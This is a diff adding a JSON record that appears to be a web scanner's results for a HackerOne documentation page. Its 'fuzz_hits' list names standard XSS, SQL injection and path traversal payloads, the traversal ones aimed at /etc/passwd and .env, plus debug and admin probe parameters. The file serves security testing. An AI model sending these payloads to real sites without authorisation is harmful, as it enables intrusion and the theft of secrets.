@@ -1,0 +1,36 @@
+{
+  "url": "https://docs.hackerone.com/en/articles/9095492-permissions",
+  "score": 111.52323819584673,
+  "leaks": [],
+  "fuzz_hits": [
+    [
+      "form:q",
+      "<script>alert(1)</script>"
+    ],
+    [
+      "form:q",
+      "' OR '1'='1;--"
+    ],
+    [
+      "form:q",
+      "../../../../etc/passwd"
+    ],
+    [
+      "form:q",
+      "../.env"
+    ],
+    [
+      "form:q",
+      "<img src=x onerror=alert(1)>"
+    ],
+    [
+      "form:q",
+      "?debug=true"
+    ],
+    [
+      "form:q",
+      "?admin=1"
+    ]
+  ],
+  "time": 0.913480281829834
+}
